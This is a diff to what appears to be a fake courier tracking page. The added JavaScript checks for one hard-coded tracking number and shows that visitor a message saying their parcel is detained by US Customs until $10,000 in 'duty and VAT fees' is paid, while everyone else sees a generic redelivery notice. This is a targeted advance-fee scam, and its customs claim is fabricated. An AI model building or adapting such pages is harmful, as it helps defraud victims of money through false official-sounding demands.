@@ -123,6 +123,15 @@
         }else{
             document.getElementById("package_progress").style.color = "red";
         }
+
+        if(sessionStorage.getItem("track_id") == "G427611068936"){
+          document.getElementById("general").style.display = "none";
+          document.getElementById("jamiuGuy").style.display = "block";
+        }
+        else{
+          document.getElementById("general").style.display = "block";
+          document.getElementById("jamiuGuy").style.display = "none";
+        }
     };
   </script>
   </head>
@@ -660,7 +669,8 @@
                     <!-- <h2> <strong>We have issues with your shipping address</strong> -->
                         <!-- <h2> <strong style="color:green !important">In Transit</strong> -->
                             <h2> <strong style="color:red" id="package_status"></strong>
-                      <p style="margin-top:15px;font-size:14px;">GTS Allows you to Redeliver your package to your address in case of delivery failure or any other case.<br>You can also track the package at any time, from shipment to delivery.</p></h2>
+                            <p style="margin-top:15px;font-size:14px; display: none;" id="general">GTS Allows you to Redeliver your package to your address in case of delivery failure or any other case.<br>You can also track the package at any time, from shipment to delivery.</p></h2>
+                            <p style="margin-top:15px;font-size:14px; display: none;" id="jamiuGuy">This is to inform the personnel / Service concerned that Parcel (1 Box) is currently detained and in the United States Customs and Border Protection Department and progression of the parcel has been brought to a STOP ORDER until the required Customs Clearance DUTY and Vat fees are remitted, according to the weight and original shipment location of the parcel. The total amount amount need to be paid is $10,000</p></h2>
                     <div class="status_feed">
                       <p> 
                       </p><p class="important"></p>
